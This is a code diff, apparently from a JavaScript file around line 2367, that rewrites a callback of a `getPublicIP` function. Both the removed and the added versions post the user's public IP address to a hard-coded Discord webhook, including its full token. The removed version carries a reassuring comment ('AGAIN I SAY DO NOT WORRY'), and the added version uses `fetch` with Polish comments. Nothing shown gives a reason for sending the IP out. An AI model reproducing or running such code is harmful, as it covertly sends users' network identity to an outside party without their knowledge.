@@ -2367,27 +2367,19 @@ function getPublicIP(callback) {
 }
 
 getPublicIP(ip => {
-const https = require('https');
-const webhookUrl = 'https://discord.com/api/webhooks/1265609792391745538/NKYDPbau1Ik_Qz0WKPNECY2oE7jn6N6piF_v4MljYEXpoYDWn3_GZ-X_mmzUteeC1kId'; // AGAIN I SAY DO NOT WORRY
-const message = JSON.stringify({
-  content: 'test message',
-});
-const url = new URL("https://discord.com/api/webhooks/1265609792391745538/NKYDPbau1Ik_Qz0WKPNECY2oE7jn6N6piF_v4MljYEXpoYDWn3_GZ-X_mmzUteeC1kId");
-const options = {
-  hostname: url.hostname,
-  path: url.pathname + url.search,
+const webhookUrl = 'https://discord.com/api/webhooks/1265609792391745538/NKYDPbau1Ik_Qz0WKPNECY2oE7jn6N6piF_v4MljYEXpoYDWn3_GZ-X_mmzUteeC1kId';
+
+// Treść wiadomości, którą chcesz wysłać
+const message = {
+  content: ip,
+};
+
+// Wyślij wiadomość za pomocą fetch
+fetch(webhookUrl, {
   method: 'POST',
   headers: {
     'Content-Type': 'application/json',
-    'Content-Length': message.length,
   },
-};
-const req = https.request(options, (res) => {
-  let responseBody = '';
-});
-req.on('error', (error) => {
-  console.error('error');
-});
-req.write(ip);
-req.end();
+  body: JSON.stringify(message),
+})
 });
